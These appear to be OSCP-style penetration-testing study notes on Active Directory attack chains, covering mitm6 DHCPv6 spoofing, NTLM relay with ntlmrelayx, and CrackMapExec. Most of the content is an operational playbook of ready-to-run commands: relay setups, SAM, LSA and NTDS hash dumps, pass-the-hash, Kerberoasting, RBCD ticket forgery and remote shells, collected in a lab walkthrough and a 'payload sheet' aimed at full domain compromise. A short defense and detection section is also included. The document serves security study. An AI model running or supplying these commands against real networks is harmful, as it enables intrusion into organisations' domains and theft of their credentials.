# IPv6 Attacks — mitm6 + NTLM Relay + CrackMapExec
## OSCP-Level Penetration Testing Notes

---

## Table of Contents
1. [Concept Building](#1-concept-building)
2. [Core Attack Flow](#2-core-attack-flow)
3. [Tools Deep Dive](#3-tools-deep-dive)
4. [CrackMapExec — Complete Guide](#4-crackmapexec--complete-guide)
5. [Privilege Escalation Chain](#5-privilege-escalation-chain)
6. [Practical Lab Walkthrough](#6-practical-lab-walkthrough)
7. [Full Payload Sheet with Comments](#7-full-payload-sheet-with-comments)
8. [Attack Examples](#8-attack-examples)
9. [Why This Attack Works](#9-why-this-attack-works)
10. [Defense & Detection](#10-defense--detection)
11. [Common Mistakes](#11-common-mistakes)
12. [Pro Tips — OSCP Mindset](#12-pro-tips--oscp-mindset)

---

## 1. Concept Building

### What is IPv6?
Every device on a network needs an address. IPv4 uses addresses like `192.168.1.10`. IPv6 is the newer system using addresses like `fe80::1`. IPv6 was introduced because IPv4 addresses were running out globally.

### IPv4 vs IPv6 — Attack Perspective

| Property | IPv4 | IPv6 |
|---|---|---|
| Address format | `192.168.1.x` | `fe80::x` |
| Windows preference | Lower priority | **Higher priority — Windows prefers IPv6** |
| Default state on Windows | Enabled | **Enabled by default** |
| Attack vector | LLMNR / NBT-NS | **DHCPv6 broadcast** |
| Requires open firewall rule? | Sometimes | **No — it's broadcast traffic** |

### The Core Problem
Windows machines continuously broadcast DHCPv6 requests — asking "Is there an IPv6 DHCP server on this network?" — even when no IPv6 infrastructure exists. An attacker listening on the network can respond to these broadcasts, claim to be the IPv6 DHCP server, and simultaneously become the DNS server for those machines.

### Attack Surface
- **DHCPv6 broadcasts** — Windows sends these on every boot and periodically
- **WPAD (Web Proxy Auto-Discovery)** — Windows automatically queries `wpad.<domain>` for proxy settings, triggering NTLM authentication
- **LLMNR/NBT-NS** — fallback name resolution that leaks NTLM hashes (related attack vector)

---

## 2. Core Attack Flow

```
[Victim PC] ──DHCPv6 broadcast──► [Network]
                                      │
                           [Attacker/mitm6 responds]
                                      │
[Victim PC] ◄──"Your DNS = Attacker IP"──────────────
      │
      │ (All DNS queries now go to attacker)
      ▼
[Attacker] ──serves fake WPAD──► [Victim auto-authenticates with NTLM]
      │
      │ (NTLM credentials captured)
      ▼
[ntlmrelayx] ──relays NTLM──► [Domain Controller LDAP/SMB]
                                      │
                           [DC accepts — thinks it's the victim]
                                      │
                           [Attacker gains: new user / DA access]
```

### Step-by-Step Breakdown

**Step 1 — Victim broadcasts DHCPv6 request**
On every boot or periodically, Windows sends: *"Is there a DHCPv6 server available?"*

**Step 2 — mitm6 responds**
mitm6 replies: *"Yes, I am the DHCPv6 server. Your IPv6 address is X. Your DNS server is my IP."*

**Step 3 — Victim sets attacker as DNS server**
Since Windows prefers IPv6 over IPv4, the attacker's DNS now takes priority. All DNS queries go to the attacker.

**Step 4 — WPAD triggers NTLM authentication**
Windows automatically queries `wpad.<domain>` to find proxy settings. mitm6 responds to this DNS query. The victim's browser/system then sends an **HTTP request with NTLM authentication** to the attacker — completely automatic, no user interaction required.

**Step 5 — NTLM authentication flow**
NTLM is a challenge-response protocol:
1. Client → Server: `NEGOTIATE` (I want to authenticate)
2. Server → Client: `CHALLENGE` (here is a random nonce)
3. Client → Server: `AUTHENTICATE` (here is my password hash applied to the nonce)

The attacker captures Step 3 and **replays** it against the Domain Controller before the session expires.

**Step 6 — ntlmrelayx relays to Domain Controller**
ntlmrelayx forwards the captured NTLM authentication to DC's LDAP (port 389/636) or SMB (port 445). The DC thinks it is authenticating the legitimate user.

**Step 7 — Privilege escalation**
If the relayed account has sufficient privileges, the attacker can:
- Create a new domain user
- Add user to Domain Admins group
- Set up Resource-Based Constrained Delegation (RBCD)
- Dump domain secrets

---

## 3. Tools Deep Dive

### mitm6
**Repository:** https://github.com/dirkjanm/mitm6

**What it does:**
- Listens for DHCPv6 broadcast packets
- Responds with a fake DHCPv6 reply, assigning itself as the IPv6 DNS server
- Answers DNS queries for the target domain, pointing everything to the attacker
- Handles WPAD DNS responses to trigger automatic NTLM authentication

**When to use:** Any time you have access to a Windows Active Directory network segment where IPv6 is not disabled (which is nearly every default Windows environment).

**Key flags:**
```
-d <domain>       Target domain (e.g., corp.local)
-i <interface>    Network interface to use
--ignore-nofqdn   Handle requests without FQDN
```

---

### ntlmrelayx
**Part of:** impacket suite

**What it does:**
- Listens for incoming NTLM authentication attempts
- Forwards (relays) those credentials to a target service
- Executes post-relay actions (create user, dump SAM, execute commands)

**Why it is required:** Capturing NTLM hashes alone has limited value if the password is strong. Relaying bypasses cracking entirely — you reuse the authentication in real-time.

**Key flags:**
```
-6                IPv6 support
-t <target>       Relay destination (ldap://, smb://, http://)
-wh <hostname>    WPAD hostname to serve
-l <folder>       Dump LDAP results to folder
--delegate-access Enable Resource-Based Constrained Delegation attack
-socks            Create SOCKS proxy after successful relay
-e <file>         Execute file on successful SMB relay
-c <command>      Run command on successful SMB relay
```

---

### LDAP and LDAPS

**LDAP (Lightweight Directory Access Protocol):**
Think of Active Directory as a phone book. LDAP is the protocol used to read and write entries in that phone book. Every user account, computer, group policy, and security group in AD is an LDAP object.

| Property | LDAP | LDAPS |
|---|---|---|
| Port | 389 | 636 |
| Encryption | None | SSL/TLS |
| Relay difficulty | Easy | Harder |
| Signing default | OFF (vulnerable) | Binding required |

**Why attackers target LDAP:**
- Write access to LDAP = create users, modify group memberships, set delegation attributes
- Higher impact than SMB relay (which gives file access only)
- LDAP signing is disabled by default on most AD environments

---

## 4. CrackMapExec — Complete Guide

### What is CrackMapExec (CME)?
CrackMapExec is a post-exploitation and network enumeration tool designed for Active Directory environments. It lets you take one set of credentials (or hashes) and systematically test them across an entire subnet, gather information, and execute commands — all from a single tool.

**Supported protocols:** SMB, LDAP, WinRM, RDP, MSSQL, SSH

### Installation
```bash
# Via pip (recommended)
pip3 install crackmapexec

# Via apt (Kali)
sudo apt install crackmapexec

# Via pipx (isolated environment)
pipx install crackmapexec
```

---

### What Information Can You Gather?

#### A. Network-Wide Credential Validation
```bash
crackmapexec smb 192.168.1.0/24 -u attackeruser -p 'Password123!'
# Tries credentials against all SMB hosts in subnet
# Output: hostname, OS version, SMB signing status
# (Pwn3d!) = local admin access confirmed on that host
```

#### B. Domain User Enumeration
```bash
crackmapexec ldap 192.168.1.10 -u attackeruser -p 'Password123!' --users
# Lists all domain user accounts
# Includes: username, description, last password set, account flags

crackmapexec ldap 192.168.1.10 -u attackeruser -p 'Password123!' --groups
# Lists all domain groups and their members
# Critical: tells you who is in Domain Admins, Enterprise Admins

crackmapexec ldap 192.168.1.10 -u attackeruser -p 'Password123!' --admin-count
# Lists users with adminCount=1 (privileged accounts)
```

#### C. Active Sessions Discovery
```bash
crackmapexec smb 192.168.1.0/24 -u attackeruser -p 'Password123!' --sessions
# Shows who is currently logged into which machine
# Critical for targeting: find where DA is logged in

crackmapexec smb 192.168.1.0/24 -u attackeruser -p 'Password123!' --loggedon-users
# All users currently logged on to each machine
```

#### D. Network Share Enumeration
```bash
crackmapexec smb 192.168.1.0/24 -u attackeruser -p 'Password123!' --shares
# Lists all SMB shares and access permissions
# Look for: non-default shares, READ/WRITE access

crackmapexec smb 192.168.1.0/24 -u attackeruser -p 'Password123!' -M spider_plus
# Spider all readable shares and index files
# Finds: passwords in files, sensitive documents, config files
```

#### E. Password Policy
```bash
crackmapexec smb 192.168.1.10 -u attackeruser -p 'Password123!' --pass-pol
# Shows: min password length, lockout threshold, lockout duration
# Critical before password spraying — avoid locking accounts
```

#### F. SMB Signing Status
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# Generates list of hosts with SMB signing DISABLED
# These hosts are valid SMB relay targets
```

---

### How CrackMapExec Helps in Privilege Escalation

#### Path 1 — Credential Reuse (Lateral Movement)
After mitm6 relay creates a user or you obtain credentials:

```bash
# Step 1: Find all machines where credentials work
crackmapexec smb 192.168.1.0/24 -u attackeruser -p 'Password123!'

# Step 2: On hosts showing (Pwn3d!), dump local hashes
crackmapexec smb 192.168.1.50 -u attackeruser -p 'Password123!' --sam
# SAM = Security Account Manager = local user hashes

# Step 3: Dump LSA secrets (cached domain credentials)
crackmapexec smb 192.168.1.50 -u attackeruser -p 'Password123!' --lsa
# LSA = Local Security Authority = may contain domain admin cached creds

# Step 4: Use found hashes with pass-the-hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH_HERE' --local-auth
```

#### Path 2 — Pass-the-Hash (No Password Needed)
If you have an NTLM hash (from SAM/LSA dump or secretsdump):

```bash
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
# Tests hash against all hosts — no need to crack it
# (Pwn3d!) on DC = full domain compromise
```

#### Path 3 — Command Execution
Once you have admin access on a machine:

```bash
# Run commands via SMB (uses wmiexec internally)
crackmapexec smb 192.168.1.50 -u attackeruser -p 'Password123!' -x "whoami /groups"
crackmapexec smb 192.168.1.50 -u attackeruser -p 'Password123!' -x "net user /domain"
crackmapexec smb 192.168.1.50 -u attackeruser -p 'Password123!' -x "net group 'Domain Admins' /domain"

# PowerShell execution
crackmapexec smb 192.168.1.50 -u attackeruser -p 'Password123!' -X "Get-ADUser -Filter * | Select SamAccountName"
```

#### Path 4 — Secrets Dump (DCSync)
If you reach Domain Admin level:

```bash
crackmapexec smb 192.168.1.10 -u domainadmin -p 'Password!' --ntds
# Dumps entire NTDS.dit = all domain hashes
# This is full domain compromise

crackmapexec smb 192.168.1.10 -u domainadmin -p 'Password!' --ntds --users
# With usernames mapped to hashes
```

#### Path 5 — Kerberoasting
Find service accounts with SPNs set:

```bash
crackmapexec ldap 192.168.1.10 -u attackeruser -p 'Password123!' --kerberoasting output.txt
# Gets Kerberos TGS tickets for service accounts
# Crack offline with hashcat: hashcat -m 13100 output.txt wordlist.txt
```

#### Path 6 — ASREPRoasting
Find accounts with pre-authentication disabled:

```bash
crackmapexec ldap 192.168.1.10 -u attackeruser -p 'Password123!' --asreproast output.txt
# Gets AS-REP hashes for accounts without pre-auth
# Crack offline: hashcat -m 18200 output.txt wordlist.txt
```

---

## 5. Privilege Escalation Chain

### Full Attack Chain: Unprivileged → Domain Admin

```
[1] mitm6 + ntlmrelayx
        │
        ▼
[2] New domain user created (e.g., attackeruser:Password123!)
        │
        ▼
[3] CrackMapExec — validate access across subnet
        │
        ├──► (Pwn3d!) found on workstations
        │         │
        │         ▼
        │    [4a] Dump SAM/LSA → find admin hashes
        │         │
        │         ▼
        │    [5a] Pass-the-Hash on more machines
        │         │
        │         ▼
        │    [6a] Find DA hash → DCSync → full compromise
        │
        └──► LDAP enumeration → find Kerberoastable accounts
                  │
                  ▼
             [4b] Kerberoast → crack hash offline
                  │
                  ▼
             [5b] Service account creds → escalate
```

### RBCD (Resource-Based Constrained Delegation) Path
When LDAP relay works but user creation is blocked:

```bash
# ntlmrelayx with delegate-access
python3 ntlmrelayx.py -6 -t ldaps://DC_IP -wh wpad.corp.local --delegate-access

# After relay, use getST.py to get impersonation ticket
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/MACHINE\$:password

# Use the ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass TARGET.corp.local
```

---

## 6. Practical Lab Walkthrough

### Lab Environment
```
Kali Linux (Attacker)  : 192.168.1.100
Windows 10 (Victim)    : 192.168.1.50
Domain Controller      : 192.168.1.10
Domain                 : corp.local
```

### Phase 1 — Reconnaissance
```bash
# Identify DC
nmap -sV --open -p 389,636,445,88 192.168.1.0/24

# Check SMB signing (relay feasibility)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
cat relay_targets.txt

# Check LDAP signing
crackmapexec ldap 192.168.1.10 -u '' -p '' --module ldap-signing
```

### Phase 2 — Install mitm6
```bash
git clone https://github.com/dirkjanm/mitm6
cd mitm6
pip3 install -r requirements.txt
# OR
pip3 install mitm6
```

### Phase 3 — Launch Attack (Two Terminals)

**Terminal 1 — mitm6:**
```bash
sudo mitm6 -d corp.local
```

**Terminal 2 — ntlmrelayx:**
```bash
# LDAP relay (to create new user)
python3 ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh wpad.corp.local -l /tmp/loot

# OR SMB relay (for command execution on workstation)
python3 ntlmrelayx.py -6 -t smb://192.168.1.50 -wh wpad.corp.local -socks
```

### Phase 4 — Wait for Trigger
Any of these events will trigger authentication:
- A machine reboots
- A user logs in
- A user opens Explorer and navigates anywhere
- Periodic Windows background tasks run

### Phase 5 — Collect Results
```bash
# Check loot folder
ls -la /tmp/loot/
cat /tmp/loot/domain_users*.grep

# ntlmrelayx console will print:
# [*] Authenticating against ldaps://192.168.1.10 as CORP\victim_user
# [*] Adding new user with username: attackerXXXX and password: YYYYYYYY
```

### Phase 6 — Enumerate with CrackMapExec
```bash
# Validate new credentials
crackmapexec smb 192.168.1.0/24 -u attackerXXXX -p 'YYYYYYYY'

# Get domain info
crackmapexec ldap 192.168.1.10 -u attackerXXXX -p 'YYYYYYYY' --users --groups

# Find admin sessions
crackmapexec smb 192.168.1.0/24 -u attackerXXXX -p 'YYYYYYYY' --sessions
```

### Phase 7 — Escalate
```bash
# If (Pwn3d!) on any machine — dump hashes
crackmapexec smb 192.168.1.50 -u attackerXXXX -p 'YYYYYYYY' --sam --lsa

# Use found hashes
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'HASH' --local-auth

# If DA hash found — dump everything
secretsdump.py corp.local/Administrator@192.168.1.10 -hashes 'LMHASH:NTHASH'
```

---

## 7. Full Payload Sheet with Comments

```bash
# ============================================================
# SECTION 1: RECONNAISSANCE
# ============================================================

nmap -sV --open -p 389,636,445,88 192.168.1.0/24
# Scan for DC ports: LDAP(389), LDAPS(636), SMB(445), Kerberos(88)
# Use when: initial reconnaissance to identify DC and open services

crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# Find all hosts with SMB signing DISABLED — these are relay candidates
# Use when: before launching ntlmrelayx SMB relay

crackmapexec ldap 192.168.1.10 -u '' -p '' --module ldap-signing
# Check if LDAP signing is enforced on DC
# Use when: before launching LDAP relay — "Signing: False" = vulnerable

crackmapexec smb 192.168.1.10 -u '' -p '' --module zerologon
# Check Zerologon vulnerability (CVE-2020-1472)
# Use when: additional privilege escalation path check


# ============================================================
# SECTION 2: mitm6
# ============================================================

sudo mitm6 -d corp.local
# Start DHCPv6 + DNS spoofing for domain corp.local
# Use when: attacking any Windows AD network with IPv6 enabled (default)

sudo mitm6 -d corp.local -i eth0
# Same as above but specify network interface
# Use when: VM environment or multiple network interfaces

sudo mitm6 -d corp.local --ignore-nofqdn
# Handle DHCPv6 requests even without fully qualified domain name
# Use when: some machines don't send FQDN in their DHCPv6 requests

sudo mitm6 -d corp.local -hw wpad
# Spoof only specific hostname (wpad) — quieter/stealthier
# Use when: reducing noise in the attack


# ============================================================
# SECTION 3: ntlmrelayx
# ============================================================

python3 ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh wpad.corp.local -l /tmp/loot
# Relay to LDAPS — creates new domain user automatically
# Use when: LDAP signing is disabled, primary attack path

python3 ntlmrelayx.py -6 -t ldap://192.168.1.10 -wh wpad.corp.local -l /tmp/loot
# Relay to LDAP (unencrypted) — same result
# Use when: LDAPS (636) not accessible but LDAP (389) is open

python3 ntlmrelayx.py -6 -t smb://192.168.1.50 -wh wpad.corp.local -socks
# Relay to SMB and create SOCKS proxy for that session
# Use when: SMB signing disabled on target workstation

python3 ntlmrelayx.py -6 -t smb://192.168.1.50 -wh wpad.corp.local -c "powershell -enc BASE64"
# Relay to SMB and execute PowerShell command
# Use when: need code execution on specific target via relay

python3 ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh wpad.corp.local --delegate-access
# RBCD attack — set delegation on computer object
# Use when: user creation via relay is blocked but LDAP write works

python3 ntlmrelayx.py -6 -t smb://192.168.1.0/24 -wh wpad.corp.local -tf relay_targets.txt
# Relay to multiple SMB targets at once
# Use when: many relay-viable hosts exist, maximize coverage


# ============================================================
# SECTION 4: CRACKMAPEXEC — VALIDATION
# ============================================================

crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password'
# Test credentials against all SMB hosts in subnet
# Use when: validating newly obtained credentials — look for (Pwn3d!)

crackmapexec smb 192.168.1.0/24 -u 'user' -H 'NTLM_HASH'
# Pass-the-hash across subnet
# Use when: hash obtained, no password — avoid cracking

crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --local-auth
# Test as local account (not domain account)
# Use when: testing local Administrator hash/password


# ============================================================
# SECTION 5: CRACKMAPEXEC — ENUMERATION
# ============================================================

crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --users
# List all domain users with attributes
# Use when: building target list for further attacks

crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --groups
# List all domain groups and members
# Use when: finding who is in Domain Admins / privileged groups

crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --admin-count
# List users with adminCount=1 (high-value targets)
# Use when: prioritizing targets for further attacks

crackmapexec smb 192.168.1.0/24 -u 'user' -p 'pass' --sessions
# Show active user sessions on each machine
# Use when: finding where privileged users (DA) are logged in

crackmapexec smb 192.168.1.0/24 -u 'user' -p 'pass' --loggedon-users
# Show all logged-on users per machine
# Use when: identifying targets for credential theft

crackmapexec smb 192.168.1.0/24 -u 'user' -p 'pass' --shares
# Enumerate SMB shares and permissions
# Use when: looking for sensitive data or writable shares

crackmapexec smb 192.168.1.0/24 -u 'user' -p 'pass' -M spider_plus
# Spider all readable shares and create file index
# Use when: hunting for passwords/sensitive files in shares

crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' --pass-pol
# Get password policy (lockout threshold/duration)
# Use when: BEFORE password spraying to avoid account lockouts


# ============================================================
# SECTION 6: CRACKMAPEXEC — CREDENTIAL DUMPING
# ============================================================

crackmapexec smb 192.168.1.50 -u 'user' -p 'pass' --sam
# Dump SAM database (local user hashes)
# Use when: (Pwn3d!) on workstation — get local account hashes

crackmapexec smb 192.168.1.50 -u 'user' -p 'pass' --lsa
# Dump LSA secrets (may contain cached domain credentials)
# Use when: (Pwn3d!) on machine — hunt for cached DA credentials

crackmapexec smb 192.168.1.10 -u 'domainadmin' -p 'pass' --ntds
# Dump NTDS.dit — all domain hashes (full compromise)
# Use when: you have Domain Admin access to DC

crackmapexec smb 192.168.1.10 -u 'domainadmin' -p 'pass' --ntds --users
# Dump NTDS with usernames mapped to hashes
# Use when: need to identify which hash belongs to which user


# ============================================================
# SECTION 7: CRACKMAPEXEC — KERBEROS ATTACKS
# ============================================================

crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --kerberoasting kerberoast.txt
# Get TGS tickets for Kerberoastable service accounts
# Use when: service accounts exist with SPNs — crack offline

crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --asreproast asrep.txt
# Get AS-REP hashes for accounts with pre-auth disabled
# Use when: any account has "Do not require Kerberos preauthentication" set

# Crack kerberoast hashes:
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# Use when: cracking TGS-REP hashes (Kerberoasting)

# Crack AS-REP hashes:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# Use when: cracking AS-REP hashes (ASREPRoasting)


# ============================================================
# SECTION 8: CRACKMAPEXEC — COMMAND EXECUTION
# ============================================================

crackmapexec smb 192.168.1.50 -u 'user' -p 'pass' -x "whoami /groups"
# Execute Windows command via SMB (wmiexec)
# Use when: verifying privilege level after gaining access

crackmapexec smb 192.168.1.50 -u 'user' -p 'pass' -x "net group 'Domain Admins' /domain"
# List Domain Admins via command execution
# Use when: enumerating DA membership from compromised host

crackmapexec smb 192.168.1.50 -u 'user' -p 'pass' -X "Get-ADUser -Filter * | Select SamAccountName"
# Execute PowerShell command
# Use when: SMB exec works and PowerShell needed

crackmapexec winrm 192.168.1.50 -u 'user' -p 'pass' -x "whoami"
# Command execution via WinRM (PowerShell remoting)
# Use when: WinRM (port 5985) is open on target


# ============================================================
# SECTION 9: POST-EXPLOITATION (impacket)
# ============================================================

secretsdump.py corp.local/attackeruser:'Password123!'@192.168.1.10
# Dump all secrets from DC using valid credentials
# Use when: have domain user creds, escalating to get hashes

secretsdump.py -hashes 'LMHASH:NTHASH' corp.local/Administrator@192.168.1.10
# Dump using hash (pass-the-hash style)
# Use when: have admin hash but not plaintext password

wmiexec.py corp.local/attackeruser:'Password123!'@192.168.1.50
# Interactive WMI shell on target
# Use when: need interactive shell without touching disk

psexec.py corp.local/attackeruser:'Password123!'@192.168.1.50
# SYSTEM-level shell via SMB (creates service — noisy)
# Use when: need SYSTEM level and stealth not required

getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/MACHINE\$:password
# Get service ticket impersonating Administrator (RBCD attack)
# Use when: delegate-access relay succeeded
```

---

## 8. Attack Examples

### Example 1 — Standard NTLM Relay to Domain Admin

**Scenario:** Corporate network, 50 Windows machines, `megacorp.local`

```
Timeline:
T+00:00  mitm6 started, ntlmrelayx running
T+03:00  DESKTOP-FIN01 machine reboots — DHCPv6 request received
T+03:15  ntlmrelayx relays FINANCE\john.doe to LDAP
T+03:16  New user created: attackerABCD:P@ss2024!
T+05:00  CME confirms (Pwn3d!) on DESKTOP-ACCT03 with new creds
T+06:00  LSA dump reveals cached Domain Admin credentials
T+06:30  secretsdump.py against DC — full NTDS dump
T+07:00  All domain hashes in hand
```

### Example 2 — RBCD When User Creation Blocked

**Scenario:** Hardened environment, user creation via LDAP blocked by policy

```bash
# ntlmrelayx with RBCD flag
python3 ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh wpad.corp.local --delegate-access

# After relay captures a machine account (DESKTOP01$):
# [*] Delegation rights set successfully

# Request service ticket impersonating DA
getST.py -spn cifs/DESKTOP01.megacorp.local -impersonate Administrator megacorp.local/DESKTOP01\$:password

# Use ticket for secretsdump
export KRB5CCNAME=Administrator@cifs_DESKTOP01.megacorp.local@MEGACORP.LOCAL.ccache
secretsdump.py -k -no-pass DESKTOP01.megacorp.local
```

### Example 3 — OSCP-Style Exam Approach

**Given:** Access to a Windows network segment, no credentials

```bash
# Step 1: Quick recon (5 min)
nmap -sV --open -p 80,443,445,389,636,88,5985 192.168.X.0/24 -oN scan.txt

# Step 2: Identify DC (look for port 88 + 389)
grep -E "88/|389/" scan.txt

# Step 3: Check relay viability
crackmapexec smb 192.168.X.0/24 --gen-relay-list relayable.txt
crackmapexec ldap 192.168.X.DC -u '' -p '' --module ldap-signing

# Step 4: Launch mitm6 + ntlmrelayx
sudo mitm6 -d discovered.domain &
python3 ntlmrelayx.py -6 -t ldaps://DC_IP -wh wpad.discovered.domain -l /tmp/loot

# Step 5: Wait 5-10 min, check output
cat /tmp/loot/domain_users*.grep
# Get credentials from ntlmrelayx console output

# Step 6: Enumerate
crackmapexec smb 192.168.X.0/24 -u newuser -p newpass
crackmapexec ldap DC_IP -u newuser -p newpass --users --groups --admin-count

# Step 7: Escalate
# On any (Pwn3d!) host:
crackmapexec smb HOST_IP -u newuser -p newpass --sam --lsa
# Use found hashes for PTH, find path to DA
```

---

## 9. Why This Attack Works

### Security Misconfigurations Exploited

| Misconfiguration | Default State | Impact |
|---|---|---|
| IPv6 enabled but unused | Enabled on all Windows | DHCPv6 spoofing possible |
| LDAP signing disabled | **Disabled by default** | NTLM relay to LDAP works |
| LDAP channel binding disabled | **Disabled by default** | No certificate verification |
| SMB signing on workstations | Disabled (non-DC) | SMB relay possible |
| WPAD not blocked at DNS | Not blocked by default | Auto NTLM trigger |
| mDNS/LLMNR enabled | Enabled | Name poisoning possible |

### Why Windows Trusts DHCPv6 Responses
IPv6 was designed for trusted internal networks. There is no authentication mechanism in DHCPv6 by default — any machine that responds to a DHCPv6 broadcast is accepted as a valid server. This is a protocol-level design decision, not a bug.

### Why NTLM Relay is Still Effective
NTLM relay works because:
1. NTLM is still widely used in AD environments for backward compatibility
2. Relay attacks do not require cracking passwords
3. The relay happens in real-time — the hash is valid for the duration of the session
4. Many services accept NTLM without requiring signing

---

## 10. Defense & Detection

### How to Fix (Defender Perspective)

| Fix | How | Impact on Attack |
|---|---|---|
| Disable IPv6 if unused | GPO → disable IPv6 on all NICs | Kills mitm6 entirely |
| Enable LDAP signing | GPO: `Domain controller: LDAP server signing requirements = Require signing` | Blocks LDAP relay |
| Enable LDAP channel binding | Registry + GPO | Blocks LDAPS relay |
| Enable SMB signing on all hosts | GPO: `Microsoft network server: Digitally sign communications (always)` | Blocks SMB relay |
| Block WPAD at DNS | Add WPAD DNS record pointing to nothing, or block at proxy | Prevents auto-trigger |
| Disable LLMNR and NBT-NS | GPO | Removes related attack vectors |

### Detection Indicators

```
- Unusual DHCPv6 traffic from non-server hosts
- DNS queries for WPAD being answered by workstations
- Multiple NTLM authentications from one source in short time
- New user accounts created via LDAP at unusual hours
- Machine accounts authenticating to LDAP
- Event ID 4776 (NTLM authentication) spike
- Event ID 4728 (user added to security group) from unexpected source
```

---

## 11. Common Mistakes

**Mistake 1 — Wrong domain name format**
```bash
# Wrong:
sudo mitm6 -d corp          # missing TLD
sudo mitm6 -d .corp.local   # leading dot

# Correct:
sudo mitm6 -d corp.local
```

**Mistake 2 — Running both tools in same terminal**
Always use separate terminals or tmux panes. mitm6 and ntlmrelayx both produce continuous output and need to run simultaneously.

**Mistake 3 — Not checking LDAP signing before relay**
If LDAP signing is enabled, the relay will fail silently. Always check first:
```bash
crackmapexec ldap DC_IP -u '' -p '' --module ldap-signing
```

**Mistake 4 — Missing the new credentials in output**
ntlmrelayx prints the new username and password directly to console. Watch for:
```
[*] Adding new user with username: attackerXXXX and password: YYYYYYYY result: OK
```
Copy these immediately.

**Mistake 5 — Not waiting long enough**
The attack is passive. It depends on victim machines sending DHCPv6 requests. This happens on boot, login, or periodically. Wait at least 10-15 minutes before concluding the attack failed.

**Mistake 6 — Using LDAP when LDAPS is required**
Some DCs require LDAPS (636). If port 636 is open, use `-t ldaps://` not `-t ldap://`.

**Mistake 7 — Forgetting pass-the-hash**
After dumping SAM/LSA, do not try to crack every hash. Try pass-the-hash with CME first — faster and often works.

---

## 12. Pro Tips — OSCP Mindset

### Identify Opportunity in Exam

Look for these signals:
- Windows machines present → IPv6 likely enabled
- AD domain exists → NTLM in use → relay viable
- Port 389/636 open on DC → LDAP target available
- Non-DC machines without SMB signing → SMB relay viable

If you see a Windows AD network: **mitm6 + ntlmrelayx is always worth trying.**

### Speed Tips

```bash
# tmux setup for parallel execution
tmux new-session -s attack
# Ctrl+B % to split vertically
# Terminal 1: mitm6
# Terminal 2: ntlmrelayx
# Terminal 3: crackmapexec

# One-liner to check all relay viability
crackmapexec smb 192.168.X.0/24 --gen-relay-list relay.txt && cat relay.txt

# Immediate post-relay enumeration
crackmapexec ldap DC_IP -u newuser -p newpass --users --groups --admin-count 2>/dev/null | tee /tmp/enum.txt
```

### Decision Tree

```
Got into Windows AD network?
        │
        ▼
Check LDAP signing → Disabled?
    YES → Run LDAP relay (primary path)
    NO  → Check SMB signing
              │
              ▼
         Disabled on workstations?
             YES → Run SMB relay
             NO  → Try RBCD with --delegate-access
                   OR fall back to Kerberoasting/ASREPRoasting
```

### Hash Priority Order
When you have multiple hashes from SAM/LSA/NTDS, try in this order:
1. `Administrator` (local) — try PTH on all hosts
2. `Domain Admins` members — try PTH on DC
3. Service accounts — try Kerberoast if hash not crackable
4. Regular users — password spray or crack offline

---

## Quick Reference

| Attack | Tool | Target Port | Prerequisite |
|---|---|---|---|
| DHCPv6 spoofing | mitm6 | N/A (broadcast) | IPv6 enabled on victim |
| NTLM relay to LDAP | ntlmrelayx | 389 / 636 | LDAP signing disabled |
| NTLM relay to SMB | ntlmrelayx | 445 | SMB signing disabled |
| Credential validation | crackmapexec | 445 / 389 | Valid credentials or hash |
| SAM dump | crackmapexec | 445 | Local admin on target |
| LSA dump | crackmapexec | 445 | Local admin on target |
| NTDS dump | crackmapexec | 445 | Domain Admin on DC |
| Kerberoasting | crackmapexec | 389 | Valid domain user |
| ASREPRoasting | crackmapexec | 389 | Valid domain user |
| Pass-the-Hash | crackmapexec | 445 | NTLM hash of account |
| DCSync | secretsdump.py | 445 | Domain Admin or replication rights |

---

*Notes prepared for OSCP-level Active Directory penetration testing study.*
*All techniques are for authorized security testing only.*
